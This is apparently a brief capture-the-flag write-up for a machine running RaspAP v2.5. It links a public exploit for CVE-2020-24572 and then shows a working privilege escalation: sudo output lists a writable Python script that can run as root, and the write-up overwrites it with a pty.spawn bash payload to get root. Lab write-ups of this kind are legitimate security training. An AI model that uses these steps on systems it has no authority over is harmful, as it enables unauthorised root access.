## INFO

server is running RaspAP v2.5
A vulnerability we can use:
https://github.com/gerbsec/CVE-2020-24572-POC/blob/main/exploit.py

## Get Root
`sudo -l`
found we can run `sudo python` with `wifi_reset.py`. Also `wifi_reset` is writable
```
    (ALL) NOPASSWD: /sbin/ifup
    (ALL) NOPASSWD: /usr/bin/python /home/walter/wifi_reset.py
    (ALL) NOPASSWD: /bin/systemctl start hostapd.service
    (ALL) NOPASSWD: /bin/systemctl stop hostapd.service
    (ALL) NOPASSWD: /bin/systemctl start dnsmasq.service
    (ALL) NOPASSWD: /bin/systemctl stop dnsmasq.service
    (ALL) NOPASSWD: /bin/systemctl restart dnsmasq.service
```
Simply run the following
```
cat >/home/walter/wifi_reset.py <<'PY'
import pty
pty.spawn("/bin/bash")
PY

sudo /usr/bin/python /home/walter/wifi_reset.py
```
Now we have root.
